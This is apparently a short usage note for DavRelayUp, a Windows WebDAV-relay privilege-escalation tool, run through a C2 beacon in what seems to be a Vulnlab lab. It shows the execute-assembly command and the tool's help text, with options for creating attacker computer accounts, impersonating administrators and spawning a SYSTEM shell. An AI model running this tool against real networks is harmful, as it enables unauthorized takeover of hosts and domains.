# DavrelayUp 
before start tasks_max_size has to larger than 4996288
## Usage
```
[02/19 20:17:09] beacon> execute-assembly /home/elliot/Documents/Vulnlab/RTL/shinra/DavRelayUp.exe -h
[02/19 20:17:16] [*] Tasked beacon to run .NET program: DavRelayUp.exe -h
[02/19 20:17:55] [+] host called home, sent: 4996288 bytes
[02/19 20:18:04] [+] received output:
DavRelayUp - Relaying you to SYSTEM, again...

Usage: DavRelayUp.exe [-c] [-cn COMPUTERNAME] [-cp PASSWORD | -ch NTHASH]

RBCD Options:
    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.
    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=DAVRELAYUP$)
    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])
    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)
    -i   (--Impersonate)              User to impersonate. Should be a local administrator in the target computer. (default=Administrator)

KrbSCM Options:
    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)
    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)

General Options:
    -p  (--Port)                     Port for WebDAV Server (default=55555)
    -d  (--Domain)                   FQDN of domain. (Optional)
    -dc (--DomainController)         FQDN of domain controller. (Optional)
    -ssl                             Use LDAP over SSL. (Optional)
    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (Optional)
    -v  (--Verbose)                  Show verbose output. (Optional)
    -h  (--Help)                     Show help
```
as u can see
